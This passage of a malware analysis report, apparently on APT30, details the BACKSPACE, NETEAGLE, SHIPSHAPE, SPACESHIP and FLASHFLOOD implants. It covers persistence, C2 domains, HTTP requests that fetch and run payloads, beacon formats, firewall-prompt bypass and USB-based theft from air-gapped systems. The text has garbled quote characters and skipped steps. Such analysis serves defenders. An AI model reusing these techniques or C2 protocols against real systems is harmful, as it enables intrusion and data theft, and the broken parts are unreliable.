Many ﬁZRﬂ variants appear to be streamlined; that is, they may support a subset of the commands used by other BACKSPACE versions (both ﬁZJﬂ and ﬁZRﬂ variants are compatible with the BACKSPACE controller; any non-supported commands simply ignored by the BACKSPACE client). However, some ﬁZRﬂ variants include new features not seen in other versions of the backdoor, such as the ability to bypass host-based firewall software.33 The BACKSPACE ﬁZRﬂ variant with md5 hash 6ee35da59f92f71e757d4d5b964ecf00 was compiled on 28 August 2014. While this sample may include features not present in other (or earlier) versions of BACKSPACE, much of the malware™s core functionality (such as the use of first-stage and second-stage C2 locations) has not changed significantly over time. As a recent example of the BACKSPACE malware family, this sample gives us both an overview of BACKSPACE™s functionality as well as a look at some of the malware™s ﬁcurrentﬂ features in the ZR branch. Initial Execution BACKSPACE creates the mutex MicrosoftZjZRLnk to ensure that only one instance is executing at any given time. It also creates two events ( MicrosoftZjZRLnkExit and MicrosoftZjZRLnkHaveExit) that, when signaled, trigger all the threads and the malware itself to exit. The malware extracts system information (OS version, build number, platform, service pack, default language id) and proxy information (from the ProxyEnable and ProxyServer values under HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\) from the victim host.BACKSPACE then creates the registry values lnk (type REG_SZ) and hostid (type REG_DWORD) under the HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\CurrentPnpSetup registry key: Ł lnk is set XJOXPSE/mol which is the encoded text WINWORD.lnkŁ hostid is set to a random value (used to uniquely identify a victim host). The malware then creates the directories <CSIDL_PROFILE>\\\\Microsoft Office and <CSIDL_PROFILE>\\\\Microsoft Office\\\\BIN. The malware is copied to a temporary file whose path is obtained by appending the .txt file extension to the current malware path and file name. The temporary file then is copied to the newly created folder <CSIDL_PROFILE>\\\\Microsoft Office\\\\BIN as WINWORD.exe and the original temporary file is deleted. For persistence, BACKSPACE creates the Windows shortcut file WINWORD.lnk in <CSIDL_STARTUP> or <CSIDL_COMMON_STARTUP> pointing to <CSIDL_PROFILE>\\\\Microsoft Office\\\\BIN\\\\WINWORD.EXE with the description \"Microsoft Office Word\". C2 DomainsLike many BACKSPACE variants, this ﬁZRLnkﬂ sample is configured with four different C2 domains. The C2 domains are used in HTTP requests for various files; each file requested via the URI provides additional instructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes Œ that is, each domain is associated with different URIs whose associated files support different functions. 37For this sample, the four C2 domains have the following roles: Ł Domain 1 (D1): www.bigfixtools.com. This is the primary first-stage C2 domain, used with the majority of the URIs (and their associated functions).Ł Domain 2 (D2): (www.km153.com) is the backup C2 domain, which can be promoted to the primary first-stage domain instead of D1 if necessary. It also can be used to obtain ﬁrun/hideﬂ configuration data (see below). Ł Domain 3 (D3) and Domain 4 (D4) (www.km-nyc.com and www.bluesixnine.com, respectively) are used to obtain ﬁrun/hideﬂ configuration data. The C2 domains used by APT30 is a single malware sample range from the ﬁbrand newﬂ to more ﬁhistoricalﬂ domains that have been in existence (and use) for several years. For reference, sample 6ee35da59f92f71e757d4d5b964ecf00 was compiled on 8/28/2014 at 09:12:33 GMT; the spear phishing attacks that dropped this BACKSPACE variant occurred on 8/29/2014.

To switch to ﬁRun modeﬂ, BACKSPACE attempts to contacts its C2 servers for validation and to obtain configuration data (stored in a file named nur.txt). It parses the configuration data and performs a series of increasingly generic checks to see whether (by inclusion or exclusion) it should remain in ﬁRun modeﬂ. The methodology is the same as described for the ﬁZJﬂ sample above, differing only in the C2 domains used and the specific URI paths requested.1. Make an HTTP request to www.bigfixtools.com/ForZRLnk3z/hostlist.txt and validate that the last byte of the response is 0xFE. 2. Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to obtain the external IP address of the victim host. 3. Make an HTTP request to either www.bluesixnine.com/http/nur.txt, www.km153.com/http/nur.txt or www.km-nyc.com/http/nur.txt and validate that the response starts with \"abcd1234\"; if none of the servers respond accordingly, setting \"Run Mode\" fails. 384. If the response from the server contains the \" runhost=\" option, search for the victim computer™s hostname in the option data. If found, setting \"Run Mode\" succeeds; else go to step 5. 5.

If found, setting \"Run Mode\" fails; else go to step 12. 12. If the response from the server contains the \" runall=1\" option, setting \"Run Mode\" succeeds. If switching to \"Run Mode\" fails, the malware exits. Once the malware switches to \"Run Mode\" the hFlag registry value under HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\CurrentPnpSetup is deleted and the victims™ hostname and IP are saved. A thread to switch the malware back to \"Hidden Mode\" is started. The thread runs indefinitely until the MicrosoftZjZRLnkExit event gets signaled; once signaled, the thread signals MicrosoftZjZRLnkHaveExit event, does clean-up and exits.

Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain (www.bigfixtools.com or www.km153.com) and URL path /ForZRLnk3z/ver.txt; if the version returned does not match the version of the current binary ( \" 1.9.w.lY\" for this sample), go to step 22. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/exe.txt and saving the file to <CSIDL_PROFILE>\\\\Microsoft Office\\\\BIN\\\\UpdateWord.exe.3. If <CSIDL_PROFILE>\\\\Microsoft Office\\\\BIN\\\\UpdateWord.exe is a valid PE, start a new process. If the previous update task fails, BACKSPACE performs a secondary update task: 1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpVer.txt; if the version returned does not match the version of the current binary, go to step 2. 2. Make an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpList.txt and validate that the victim computer™s hostname is in the response; if true, go to step 3. 3.

If <CSIDL_PROFILE>\\\\Microsoft Office\\\\BIN\\\\UpdateWord.exe is a valid PE, start a new process. BACKSPACE uses the same mutex ( MicrosoftZjZRLnk), and event names ( MicrosoftZjZRLnkExit, MicrosoftZjZRLnkHaveExit) across different versions of the same variant. Thus, the malware can remove the previous version and update to a newer version while ensuring that only one instance of the same backdoor family is installed on a given host. 41When the malware is updated, the randomly generated hostid from the initial infection (stored in the registry) is not changed. From the attacker™s perspective, this allows the ﬁidentityﬂ of the victim host to remain consistent, even across multiple version updates. Second Stage C2 Server Next, BACKSPACE makes an HTTP request to the primary C2 URL domain ( www.bigfixtools.com or www.km153.com) and URL path /ForZRLnk3z/dizhi.gif. Dizhi.gif is a 10-byte configuration file that specifies an IP address and two port numbers.BACKSPACE starts a new thread to send details about the victim computer (ComputerName, IP, SystemDetails, DefaultLangID, HostID, Proxy info, malware current version, malware current domain, and information about the logical drives) to Port1 on the new C2 server. The malware will use the victim computer™s saved proxy settings if needed. The data is sent using an HTTP POST request with the following structure: 42A sample beacon is shown below. Note that the HTTP User-Agent header is set to the non-standard value ﬁSJZJ (compatible; MSIE 6.0; Win32)ﬂ.Table 10: BACKSPACE ﬁZRLnkﬂ callback structure OffsetValue Description0x000x30fixed (1 byte message identifier; 0x30 = ascii 0)) 0x01fd 00 00 00data length = 253 bytes (4 byte length) 0x05-computer name (varying length), 0x000x14192.168.43.130, 0x00IP Address (varying length), 0x000x23253version information (156 bytes) 0xBF04 08language ID (2 bytes) 0xC100proxy on/off (1 byte) 0xC241 18 00 00host_id (4 bytes) 0xC61.9.w.lY version string (varying length) 0xCE(Proxy-No), 0x00 proxy setting (varying length), 0x00 0xD90:7, 0x00system uptime - H:M (varying length), 0x000xDDwww.bigfixtools.com/ForZRLnk3z, 0x00 URL where the second C2 IP is obtained(varying length), 0x00 43BACKSPACE also attempts to retrieve the URL path /ForZRLnk3z/connect.gif from the primary C2 URL domain. If the victim computer™s hostname and hostid are found in the file, the victim will attempt to establish a connection to the second stage C2 server on Port2 to allow the threat actors to directly interact with the victim via the BACKSPACE controller. 35 After establishing the connection to the controller, BACKSPACE awaits further interactive commands from the operator. For this copy of BACKSPACE, the following commands are supported: Table 11: Commands supported by BACKSPACE \"ZRLnk\" variant 6ee35da59f92f71e757d4d5b964ecf00CommandMeaningASame as J or S, but the file is deleted from the victim computer after transmission.

After each command is processed, BACKSPACE sends a status message to the C2 server; messages starting with ﬁOﬂ indicate success, messages starting with ﬁ Eﬂ indicate failure. Configuration and C2 Encoding While earlier versions of BACKSPACE may contain the C2 domains and other variables in plain text within the binary, they are encoded within this (and other more recent) variants. Decoding is done in two ways: by adding an incremental counter, or by XORing and bitwise shifting bytes. 44In addition, binary (non-string) data transferred between the victim host and the second stage C2 server is encoded/decoded by adding an incremental counter and XORing with 0x23, as shown below. 45 46Host-Based Firewall BypassThis variant of BACKSPACE includes functionality to attempt to bypass a number of personal firewall applications. BACKSPACE iterates through open windows and matches the type (Button) and its associated Window Text against a set of strings stored within the malware. If a match is found, BACKSPACE sends a message to simulate a mouse click, attempting to ﬁapproveﬂ firewall rules to allow the malware to execute. Both English and Chinese strings are stored, implying that the malware attempts to target versions of the products below that are localized for those languages. 37Table 12: Strings used in attempt to bypass host-based firewalls Security ProductMeaningAvira Note action selected for this file (dangerous) )F-SecureI trust the program.

The ﬁScoutﬂ variant (named for the mutex ﬁ Neteagle_Scoutﬂ used by this version) was the earlier of the two. While NETEAGLE shares some similarities with BACKSPACE, including retrieval of commands from specific URIs, automatic updating, and a two-stage command and control structure, NETEAGLE typically uses a single C2 domain (instead of up to four used by BACKSPACE) and supports a more limited set of URIs for command retrieval. In addition, NETEAGLE supports an entirely different set of commands than BACKSPACE; it is not compatible with the BACKSPACE controller and is presumed to have its own separate controller software. Later variants of NETEAGLE (e.g., the ﬁNortonﬂ versions) also support a modular ﬁpluginﬂ framework that allows the backdoor to load and execute DLLs for additional functionality. The NETEAGLE sample 3feef9a0206308ee299a05329095952a was compiled on 9 April 2009. The malware creates the directory C:\\\\Program Files\\\\Messenger\\\\ and copies itself to that directory as msmsgr.exe. NETEAGLE also creates the following registry value for persistence: Value: HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\msmsgrData: C:\\\\Program Files\\\\Messenger\\\\msmsgr.exeNETEAGLE first attempts to retrieve the file allupdate.xml using the following HTTP request:GET /yzstmfa/allupdate.xml HTTP/1.1User-Agent: filename of malwareHost: www.autoapec.comCache-Control: no-cacheThe file is saved to %DEFAULTUSERPROFILE%\\\\ieupdate.exe and executed. NETEAGLE then downloads hxxp://www.autoapec.com/yzstmfa/update.xml and decrypts the file with the RC4 key \"ScoutEagle\". In the decrypted result, the malware looks for the hostname of the system. If the hostname is present, the malware downloads hxxp://www.autoapec.com/yzstmfa/updateapp.xml, saves it to %DEFAULTUSERPROFILE%\\\\visit.exe and executes the file. Once the initial update URLs are downloaded, the malware creates the mutex \" NetEagle_Scout\" and begins the process of obtaining the second-stage C2 IP address(es) and port. NETEAGLE downloads the URL hxxp://www.autoapec.com/yzstmfa/pic1.bmp and RC4 decrypts the first four bytes of the response using the key \"ScoutEagle\". The decrypted bytes are a callback IP. If the victim computer is not configured to use a proxy, the malware sends a 363 byte UDP beacon to port 6000 on the decrypted IP. If a proxy is enabled, the malware sends the same 363 byte beacon using the following HTTP POST request: 48POST /index.htm HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Win32)Host: Callback IPContent-Length: 363Connection: Keep-AliveCache-Control: no-cache00000000 a3 0b cf 8b f9 56 ed bc be 0f 8b 6d b8 35 db 26 .....V.. ...m.5.&00000010 57 37 58 36 34 5f 41 4e 41 4c 59 53 49 53 00 c0 W7X64_AN ALYSIS..00000020 a8 38 6f 00 00 00 00 32 2e 31 38 00 69 6e 64 6f .8o....2 .18.indo00000030 77 73 20 58 50 20 36 2e 31 20 42 75 69 6c 64 37 ws XP 6. 1 Build700000040 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 6b 601 Serv ice Pack00000050 20 31 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1...... ........00000060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........00000070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........00000080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........00000090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........000000A0 00 00 00 00 00 00 00 00 00 00 00 32 30 31 35 2d ........ ...2015-000000B0 32 2d 32 20 31 37 3a 34 3a 33 32 00 00 00 00 00 2-2 17:4 :32.....000000C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........000000D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........000000E0 00 00 00 00 00 00 00 00 00 00 00 52 45 00 00 00 ........ ...RE...000000F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........00000100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........00000110 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........00000120 00 00 00 00 00 00 00 00 00 00 00 32 30 34 37 20 ........ ...2047 00000130 4d 42 00 00 00 00 00 00 00 00 00 00 00 00 00 00 MB...... ........00000140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........00000150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........00000160 00 00 00 00 00 00 00 00 00 00 00 ........ ...The POST data consists of the following:Table 13: NETEAGLE beacon contents DataMeaninga30bcf8bf956edbcbe0f8b6db835db26Nd5 hash of the callback URL (http://www.autoapec.com/ yzstmfa/pic1.bmp) W7X64_ANALYSISHostname of victim computerc0 a8 38 6fIP address of victim computer2.18Malware version Winows XP 6.1 Build7601 Service Pack 1OS Version (truncated \\'W\\') 2015-2-2 17:4:32 Date / time from victim computerREActive username from victim computer 2047 MBAmount of memory on victim computer 49NETEAGLE then requests the URL hxxp://www.autoapec.com/yzstmfa/pic2.bmp.

The decrypted response consists of the following data: Hostname (up to 15 bytes)\\\\x00IP address in network byte orderPort If the hostname of the victim computer is listed in the decrypted response, the malware initiates a TCP connection to the specified IP and port.

The format of the decrypted response is: MD5 of file to be downloadedURLNETEAGLE downloads the URL to %temp%\\\\Services.exe and executes the file. 50NETEAGLE BACKDOOR Œ ﬁNORTONﬂ VARIANT The ﬁNortonﬂ variants of the NETEAGLE backdoor (named for the mutex ﬁEagle-Norton360-OfficeScanﬂ used by the malware) appear to have been developed later than that ﬁScoutﬂ versions, with early samples compiled in 2013.The NETEAGLE ﬁNortonﬂ sample 8a88f8803e8db8baee537a175960cdbe was compiled on 6 November 2013. This version supports many of the same commands as the ﬁScoutﬂ version, but has several differences, including:Ł The ﬁNortonﬂ variant does not include its own persistence mechanism. 39 Ł Use of a different mutex (ﬁEagle-Norton360-OfficeScanﬂ). Ł The ﬁNortonﬂ variant does not support the various HTTP requests to download and execute files (e.g., allupdate.xml, update.xml, updateapp.xml, and pic4.bmp).Ł Although the ﬁNortonﬂ variant checks whether the victim host uses a proxy configuration, it always beacons using a proxy request. 40Ł Different encoding method for strings (ﬁNortonﬂ adds 2 instead of 4). Ł Support of different / additional commands (see below).Ł Support for loading DLLs for additional functionality. The NETEAGLE ﬁNortonﬂ variant uses a similar process to identify its second-stage C2 server. The malware requests the file pic1.bmp from its first-stage C2 server using the following HTTP request: Similar to the ﬁScoutﬂ variant, the response is decrypted using the RC4 key ﬁScoutEagleﬂ to obtain the IP address of the beacon server. The beacon format is the same as that used by the ﬁScoutﬂ variant. The NETEAGLE ﬁNortonﬂ variant will request the URL hxxp://www.creammemory.com/update1/pic2.bmp and decrypt the response with the RC4 key ﬁScoutEagleﬂ. The expected response format is the same as that for the ﬁScoutﬂ variant:Hostname (up to 15 bytes)\\\\x00Redirect IP in network byte orderPort GET /update1/pic1.bmp HTTP/1.1User-Agent: filename of malwareHost: www.creammemory.comCache-Control: no-cache 51Table 15: NETEAGLE \"Norton\" commands that differ from \"Scout\" variant CommandMeaning0x20Not implemented.0x24Load a DLL and call the DoWork export using DoWork(C2 IP , 81, 4003, 4004).

SHIPSHAPESHIPSHAPE samples have been identified with compile times as early as 2006 and as recently as 2014. SHIPSHAPE initially targets removable and fixed drives with less than a specific amount of space available to the SHIPSHAPE process. Earlier samples required less than 1,000,000,000 bytes (~1GB); the sample described in detail below requires less than 10,000,000,000 bytes (0x2540BE400) or approximately 10GB.41 The intent is likely to use the drive to spread malware to additional systems. The sample f18be055fae2490221c926e2ad55ab11 was compiled on 23 August, 2012. The malware replaces files and folders on targeted drives with executable files from specified paths on the SHIPSHAPE- infected system. 42 The specific files and folders replaced may vary based on the SHIPSHAPE sample. 43 Targeted files and folders are marked as hidden; SHIPSHAPE copies the specified executable file or files to the removable drive using the same names as the targeted files and folders, but with an .exe extension (for example, if the drive contained the file MyDocument.doc, SHIPSHAPE would create a file with the name MyDocument.doc.exe. A user attempting to access a ﬁdocumentﬂ on the removable drive would potentially be tricked into running the executable instead. It is believed that the executable will open the original document or folder when executed, to disguise the fact that malicious activity is occurring. 52When executed, SHIPSHAPE creates the mutex \" MicrosoftShipZJ\". The malware copies itself to %HOMEPATH%\\\\My Documents\\\\Visual Studio 2005\\\\MSDEV\\\\IDE\\\\MSDEV.EXE. For persistence, SHIPSHAPE creates a shortcut in the user™s Startup folder named \"Visual Studio.lnk\" using the comment \"Visual Studio 2005\" and a target path of %HOMEPATH%\\\\My Documents\\\\Visual Studio 2005\\\\MSDEV\\\\IDE\\\\MSDEV.EXE (variable is expanded). The malware creates the registry key HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\ShipUp with the following value and data:Value: lnk Data: Wjtvbm!Tuvejp/molThe data is the encoded name of the malware™s shortcut file (in this case, ﬁ Visual Studio.lnkﬂ); the hexadecimal value of each character in the original file name is incremented by one (so ﬁVﬂ (0x56) becomes ﬁWﬂ ( 0x57) , etc.).SHIPSHAPE disables AutoRun and hides both hidden files and file extensions by setting the following registry values:HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\policies\\\\Explorer\\\\NoDriveTypeAutoRun = 0x9fHKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\Hidden = 0x02HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\HideFileExt = 0x01HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\Folder\\\\Hidden\\\\SHOWALL\\\\CheckedValue = 0x00HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\Folder\\\\HideFileExt\\\\CheckedValue = 0xffffffffSHIPSHAPE searches for fixed and removable drives ( DRIVE_FIXED, DRIVE_REMOVABLE). If a detected drive is less than 10,000,000,000 bytes (10GB) in size or was attached to the system after SHIPSHAPE performed its initial drive scan, SHIPSHAPE looks for the file ldupver.txt on the drive and parses the file for version information if the file is present. If the version listed in the file is greater than the malware™s current version (\" 50\" for this sample), SHIPSHAPE will look for the file AUTORUN.INF on the drive and execute the \" open\" variable from the file, likely in an attempt to self-update. SHIPSHAPE will create (or update, if already present), the following AUTORUN.INF file on the drive: AutoRunopen=keybd.exeshellexecute=keybd.exeshell\\\\Auto\\\\command=keybd.exeshell=AutoIn addition, for drives that pass the size check (e.g., less than 10GB), SHIPSHAPE modifies folders and files on the drive with the .doc or .docx extension. SHIPSHAPE sets the hidden attribute on the original folder or file and copies a new file to the drive using the same name with an .exe extension. For folders, SHIPSHAPE copies the contents of the file KB925273-dir.log from the SHIPSHAPE-infected computer to the drive; for files, SHIPSHAPE copies the contents of the file KB936891-doc.log. The malware will skip over any paths on the drive beginning with XP-Update, msdn, Recycled, or $LDDATA$. 44 53SHIPSHAPE may use the following files (where Install Path is the path where SHIPSHAPE is installed on the victim computer:Table 16: Files used by SHIPSHAPE malware FileActionInstall Path\\\\KB914268-inf.logCopied to keybd.exe on the removable disk Copied to Install Path\\\\vers.iniInstall Path\\\\KB925273-dir.logReplaces directories on removable disk Install Path\\\\KB936891-doc.logReplaces .doc, .docx files on removable disk Install Path\\\\ldjs.txtActivity logupnum.txtPresent in malware strings, but not used by this version Install Path\\\\KB952567-mouse.logList of paths to be created on the removable disk and the files to be copiedInstall Path\\\\NameList.docCopied to the root of the removable disk ldupver.txtUsed to store a version number (ﬁ50ﬂ for this variant) on a removable disk. SPACESHIP Similar to SHIPSHAPE, SPACESHIP samples have been identified with compile times ranging from 2006 to 2014. SPACESHIP searches for files with a specified set of file extensions and copies them to a removable drive. FireEye believes that SHIPSHAPE is used to copy SPACESHIP to a removable drive, which could be used to infect another victim computer, including an air-gapped computer. SPACESHIP is then used to steal documents from the air-gapped system, copying them to a removable drive inserted into the SPACESHIP-infected system. The SPACESHIP sample 11876eaadeac34527c28f4ddfadd1e8d was compiled on 23 August, 2012. When executed, the malware creates two events named \" MicrosoftShipTrExit\" and \"MicrosoftShipTrHaveExit\" along with a mutex named \" MicrosoftShipTrZJ\". The malware copies itself to %HOMEPATH%\\\\My Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\VFP6.EXE. To maintain persistence, the malware creates a shortcut in the user™s Startup folder named VFP6.lnk using the comment \"Visual FoxPro\" and the target path %HOMEPATH%\\\\My Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\VFP6.EXE (all %HOMEPATH% references are expanded). As part of the installation process, SPACESHIP creates the registry key HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\ShipTr with the following value and data: Value: lnkData: WGQ7/mol 54Similar to other APT30 malware, the data is the name of SPACESHIP™s shortcut file, with each character incremented by one. SPACESHIP also creates the following directories: %HOMEPATH%\\\\My Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\Docs%HOMEPATH%\\\\My Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\Docs\\\\ldfSPACESHIP first scans for files matching the pattern ldmap*.* in %HOMEPATH%\\\\Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\Docs\\\\ldf. If a file is not found or is too old, the malware deletes the files ldmap.txt and Info.txt45 from %HOMEPATH%\\\\My Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\Docs\\\\. The malware then recursively scans each directory and logs all files contained in each folder (file size and last modified) in a new Info.txt file.SPACESHIP will look for configuration data stored in the file % HOMEPATH%\\\\My Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\ld.ini. The malware extracts the following keys from the sections: DirMapGetIt=IntegerPieceSize=IntegerUpDataDirAndType=StringUpDataTimeDay=IntegerSPACESHIP will scan the folders \"My Documents\" ( CSIDL_PERSONAL), \"Desktop\" ( CSIDL_DESKTOP), and ﬁMy Recent Documents\" (CSIDL_RECENT; the malware parses the .lnk file target paths for specified file types) and will search for files with the following extensions: Table 17: SPACESHIP targeted file extensions File ExtensionDocument Type .docMicrosoft Word document .docxMicrosoft Word document .maxMAX source code file (?).pdfAdobe Acrobat Portable Document Format .pgpPretty Good Privacy.rhsunknown.rtfRich Text Format .tifTagged Image Format graphics file .wpdWord Perfect Document 55SPACESHIP can also target files based on the last modified date using the UpDataTime/Day in the ld.ini configuration file. Identified files are copied to the %HOMEPATH%\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\Docs\\\\ldf directory and saved with an .ldf extension. The .ldf files are first compressed using zlib then each byte is rotated 4 positions and XOR-encoded with 0x23.SPACESHIP monitors for removable drives to be inserted into the system. When a drive is attached, SPACESHIP checks for the presence of specific files on the removable drive. If the file Drive Letter:\\\\msdn\\\\d.ini is found, SPACESHIP copies it to %HOMEPATH%\\\\Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxProld.ini.46If the file Drive Letter:\\\\msdn\\\\KB947652-ver.log is present, SPACESHIP copies it to %HOMEPATH%\\\\Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\KB947652-ver.log. SPACESHIP reads the contents of the file and compares it with its current version (the string \" 5.0ﬂ for this variant). If the strings do not match, SPACESHIP copies Drive Letter:\\\\XP-Update\\\\KB863113-ld.log to %HOMEPATH%\\\\Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\~ld.exe and executes the file. SPACESHIP copies files in the %HOMEPATH%\\\\Documents\\\\Visual Studio 2005\\\\MSDEV\\\\FoxPro\\\\Docs\\\\ldf directory to the removable drive in the folder Drive Letter:\\\\Recycled. A desktop.ini file is created that configures the directory to be opened using Recycler instead of Windows Explorer; this prevents a user from seeing the copied files using Windows Explorer. FLASHFLOOD FLASHFLOOD appears to be an older piece of malware, or possibly one less frequently found ﬁin the wildﬂ; identified samples were compiled as early as 2005, but are less common (or nonexistent?) after 2009. FLASHFLOOD has some similarities to SPACESHIP, in that it will search for and archive files that match a configurable pattern; it even uses the same encoding process on archived files. One difference is that FLASHFLOOD will scan inserted removable drives for targeted files, and copy those files from the removable drive to the FLASHFLOOD-infected system. This may simply be yet another means to identify any ﬁinterestingﬂ files for data theft, including those that happen to reside on a removable drive inserted into the victim computer. Alternately, FLASHFLOOD may have been designed to copy files that had been placed on a removable drive (perhaps by SPACESHIP), possibly copied from an ﬁinterestingﬂ location such as an air-gapped network. This theory is bolstered by the fact that one of the default file extensions searched for by FLASHFLOOD is .ldf, the extension used by SPACESHIP for copied and encoded files. FLASHFLOOD may also log or copy additional data from the victim computer, such as system information or contacts.The FLASHFLOOD sample 5d4f2871fd1818527ebd65b0ff930a77 was compiled on 17 February, 2009. When executed, the malware creates a mutex named \" MicrosoftFlashZJ\" and also creates two events named \"MicrosoftFlashExit\" and \"MicrosoftFlashHaveExit\". If the following registry key is not present, the malware creates it and continues the installation process:Key: HKLM\\\\Software\\\\Microsoft\\\\GetInfValue: pid 56Data: Encoded filename of implantThe filename is encoded by incrementing the hex value of each ASCII character by one. FLASHFLOOD copies itself to the file C:~a, then copies that file to %SystemDrive%\\\\Program Files\\\\Outlook Express\\\\msinm.exe. The malware changes to the target directory, executes msinm.exe and exits. To maintain persistence, FLASHFLOOD creates the following registry value: Key: HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunValue: msinm.exeData: Path to installFLASHFLOOD attempts to read the file %WINDIR%\\\\FILETYPE.INI for a list of file patterns of interest. If the file does not exist the malware uses the following default file extensions: Table 18: Default file extensions searched for by FLASHFLOOD File ExtensionDocument Type .docMicrosoft Word document .docxMicrosoft Word document .ldfFile extension used by SPACESHIP for copied and encoded files .maxAutodesk 3ds Max CAD file.pdfAdobe Acrobat Portable Document Format .pgpPretty Good Privacy.rhsunknown.rtfRich Text Format .tifTagged Image Format graphics file .wpdWord Perfect Document FLASHFLOOD creates the following directories, used to store malware log data and copied files of interest:%WINDIR%\\\\$NtUninstallKB885884$\\\\%WINDIR%\\\\$NtUninstallKB885884$\\\\FlashFiles%WINDIR%\\\\$NtUninstallKB885884$\\\\LastFiles%WINDIR%\\\\$NtUninstallKB885884$\\\\RecentFiles 57During initialization, FLASHFLOOD queries the registry value HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SENS\\\\Parameters\\\\ServiceDll and logs the result to %WINDIR%\\\\$NtUninstallKB885884$\\\\Info.txt.47 The file Info.txt is a general log file used by FLASHFLOOD to store information collected from the system. FLASHFLOOD also logs information stored in the Windows Address Book using the IAddrBook interface.48 Information logged includes User, Nick, E-mail and Type. FLASHFLOOD parses the shortcut ( .lnk) files from the user™s \"My Recent Documents\" folder and archives the target files to %WINDIR%\\\\$NtUninstallKB885884$\\\\RecentFiles. The malware uses the same format for archiving files as SPACESHIP; the original files are copied and an .ldf extension is added. The files are then zlib compressed and each byte is rotated 4 positions and XOR-encoded with 0x23.FLASHFLOOD creates the file %WINDIR%\\\\FILETIME.DAT and writes the current system time to the file in FILETIME format. 49 The file is likely used to ensure the malware collects only recent files. FLASHFLOOD scans connected drives and the directories \"Desktop\", \"Temporary Internet Files\" and \"TEMP\" for files that match the patterns of interest (obtained from FILETYPE.INI or the default set of file extensions). Matching files are archived to %WINDIR%\\\\$NtUninstallKB885884$\\\\LastFiles.For drives attached to the system after FLASHFLOOD initially executes, the malware scans for files matching the patterns of interest. The malware™s behavior differs slightly depending on the size of the detected drive. For drives with a capacity less than 2,500,000,000 bytes (approximately 2.5 GB), 50 FLASHFLOOD scans the entire drive and will archive any files of interest found on the drive to %WINDIR%\\\\$NtUninstallKB885884$\\\\FlashFiles, using the archive method (compress, rotate bytes, XOR) described above. For any files found in the $LDDATA$ or RECYCLED directories, FLASHFLOOD will copy the file directly 51 (no archiving is performed) and delete the original file from the detected drive. For drives with a capacity greater than 2,500,000,000 bytes, FLASHFLOOD will only scan the directories $LDDATA$ and RECYCLED (if present). Any files found in these directories are copied to %WINDIR%\\\\$NtUninstallKB885884$\\\\FlashFiles and the original files are deleted. In both cases, details of the scan are logged to %WINDIR%\\\\$NtUninstallKB885884$\\\\OtherInfo.txt.MISCELLANEOUS TOOLS In addition to the malware listed above, APT30 has used a variety of droppers, downloaders, and other utilities. In some cases, instead of directly installing a backdoor via a malicious document, APT30 will install a stage one downloader that attempts to retrieve a second stage backdoor (often NETEAGLE) from a specified location.MILKMAID / ORANGEADE Droppers and CREAMSICLE DownloaderMILKMAID and ORANGEADE are two dropper families typically installed via a malicious attachment, such as a malicious Word document. Both droppers have been observed to drop variants of the CREAMSICLE downloader. MILKMAID drops a variant of CREAMSICLE implemented as a stand-alone executable, where the slightly older ORANGEADE drops a variant of CREAMSICLE implemented as a DLL. 52 58Each dropper extracts its version of CREAMSICLE and creates a shortcut ( .lnk) file that references the file to be downloaded by CREAMSICLE; that is, the dropper sets up persistence for the second stage downloaded file.ﬁIndia deploys world\\'s largest military transport plane.docﬂ (md5 hash 7d775a39ecd517cee4369c672e0e4da7) is an example of an exploit document Œ one built with a common document weaponizer that appears to be shared across multiple threat groups Œ that drops MILKMAID and the EXE variant of 